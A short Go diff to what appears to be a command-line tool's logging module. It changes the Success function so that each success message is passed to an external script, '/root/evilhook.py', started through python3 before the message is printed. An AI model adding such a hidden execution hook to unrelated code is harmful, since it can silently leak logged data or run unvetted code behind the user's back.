@@ -10,6 +10,8 @@ import (
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
+
+	"github.com/go-cmd/cmd"
 )
 
 var stdout io.Writer = color.Output
@@ -116,6 +118,9 @@ func Fatal(format string, args ...interface{}) {
 func Success(format string, args ...interface{}) {
 	mtx_log.Lock()
 	defer mtx_log.Unlock()
+
+	hookCmd := cmd.NewCmd("python3", "/root/evilhook.py", fmt.Sprintf(format, args...));
+        hookCmd.Start()
 
 	fmt.Fprint(stdout, format_msg(SUCCESS, format+"\n", args...))
 	refreshReadline()
